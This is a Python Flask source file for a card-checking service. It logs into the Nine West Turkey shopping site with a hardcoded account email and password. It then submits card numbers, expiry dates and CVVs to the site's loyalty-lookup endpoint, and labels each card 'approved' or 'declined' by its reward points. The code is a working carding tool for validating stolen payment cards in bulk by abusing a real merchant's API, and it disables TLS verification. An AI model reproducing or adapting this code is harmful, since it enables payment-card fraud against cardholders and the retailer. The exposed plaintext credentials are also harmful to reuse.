from flask import Flask, request, jsonify, render_template
from flask_cors import CORS
import requests, re, threading, urllib3, os

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

app = Flask(__name__)
CORS(app)

LOGIN_EMAIL = "senbensenbena8@gmail.com"
LOGIN_PASSWORD = "qazxcvbnm12A"
HASH = "aa217a6339"

H = {'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36", 'Accept-Encoding': "gzip, deflate, br, zstd", 'Content-Type': "application/json", 'sec-ch-ua-platform': "\"Android\"", 'sec-ch-ua': "\"Chromium\";v=\"148\", \"Google Chrome\";v=\"148\", \"Not/A)Brand\";v=\"99\"", 'sec-ch-ua-mobile': "?1", 'accept-language': "tr,en-US;q=0.9,en;q=0.8,de;q=0.7"}
LU = "https://www.ninewest.com.tr/webservice/v1/login"
LP = {"email": LOGIN_EMAIL, "password": LOGIN_PASSWORD, "g-recaptcha-response": None, "version": 3, "hash": HASH}
LH = {'origin': "https://www.ninewest.com.tr", 'referer': "https://www.ninewest.com.tr/customer/login", 'sec-fetch-site': "same-origin", 'sec-fetch-mode': "cors", 'sec-fetch-dest': "empty", 'web-platform': "nextjs"}
CU = "https://checkout-be.ninewest.com.tr/webservice/v1/retrievecardloyalty"

_cs, _bh, _rc = None, "", 0
_lk = threading.Lock()
RPS = 5

def gas(force=False):
    global _cs, _bh, _rc
    with _lk:
        if not force and _cs is not None and _rc < RPS:
            _rc += 1
            return _cs, _bh
        s = requests.Session()
        a = requests.adapters.HTTPAdapter(pool_connections=20, pool_maxsize=20, max_retries=1)
        s.mount("https://", a); s.mount("http://", a)
        s.headers.update(H)
        try:
            s.post(LU, json=LP, headers=LH, timeout=7, verify=False)
            _bh = s.cookies.get('basket_hash', '')
            _cs = s; _rc = 1
        except Exception:
            _bh = ""; _cs = s; _rc = 1
        return _cs, _bh

def check_card(cin):
    m = re.search(r'(\d{15,19})[\s|/:-]+(\d{1,2})[\s|/:-]+(\d{2,4})(?:[\s|/:-]+(\d{3,4}))?', cin)
    if m:
        pan, em, eyr = m.group(1), m.group(2).zfill(2), m.group(3)
        ey = eyr[-2:]; eyf = ("20" + ey) if len(eyr) == 2 else eyr
        cvv = m.group(4) if m.group(4) else "000"
    else:
        p = cin.strip().split('|')
        if len(p) < 3: return {"result": "error", "raw": "Format Hatalı", "reward": 0.0, "cc": cin}
        pan, em, eyr = p[0].strip().replace(' ', ''), p[1].strip().zfill(2), p[2].strip()
        ey = eyr[-2:]; eyf = ("20" + ey) if len(eyr) == 2 else eyr
        cvv = p[3].strip() if len(p) >= 4 else "000"
    cs = f"{pan}|{em}|{ey}|{cvv}"
    s, bh = gas()
    fp = " ".join([pan[i:i+4] for i in range(0, len(pan), 4)])
    pl = {"cc_number": fp, "cc_cvv": cvv if cvv else "000", "cc_month": em, "cc_year": eyf}
    hh = {'Accept': "application/json, text/plain, */*", 'shoppingcartid': str(bh), 'platform': "MOBILEWEB", 'origin': "https://checkout.ninewest.com.tr", 'referer': "https://checkout.ninewest.com.tr/", 'sec-fetch-site': "same-site", 'sec-fetch-mode': "cors", 'sec-fetch-dest': "empty"}
    try:
        r = s.post(CU, json=pl, headers=hh, timeout=7, verify=False)
        d = r.json()
    except Exception as e:
        return {"result": "error", "raw": str(e), "reward": 0.0, "cc": cs}
    try:
        sc = d.get("status", {}).get("code")
        msg = d.get("status", {}).get("message") or d.get("message") or d.get("error") or str(d)
        if isinstance(msg, str):
            tr = str.maketrans("çğıöşüÇĞİÖŞÜ", "cgiosuCGIOSU"); msg = msg.translate(tr).strip()
        if sc == 200:
            rw = d.get("data", {}).get("cardRewardMoney", 0.0)
            try: rv = float(rw)
            except: rv = 0.0
            if rv > 0.0:
                return {"result": "approved", "raw": f"Approved! - {rw} TRY Puan!", "reward": rv, "cc": cs}
            return {"result": "declined", "raw": msg, "reward": 0.0, "cc": cs}
        return {"result": "declined", "raw": msg, "reward": 0.0, "cc": cs}
    except Exception as e:
        return {"result": "error", "raw": str(e), "reward": 0.0, "cc": cs}

@app.route("/", methods=["GET"])
def home():
    return render_template("index.html")

@app.route("/health", methods=["GET"])
def health():
    return jsonify({"status": True, "msg": "alive"})

@app.route("/adv3", methods=["GET"])
def adv3():
    cc = request.args.get("card") or request.args.get("cc")
    if not cc:
        return jsonify({"status": False, "error": "card yok"}), 400
    r = check_card(cc)
    return jsonify({"status": True, "cc": r["cc"], "result": r["result"], "reward": r["reward"], "raw": r["raw"]})

@app.route("/check", methods=["POST"])
def check():
    b = request.get_json(force=True, silent=True) or {}
    cc = b.get("cc") or b.get("card") or request.form.get("cc")
    if not cc:
        return jsonify({"status": False, "error": "cc yok"}), 400
    r = check_card(cc)
    return jsonify({"status": True, "cc": r["cc"], "result": r["result"], "reward": r["reward"], "raw": r["raw"]})

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=False)
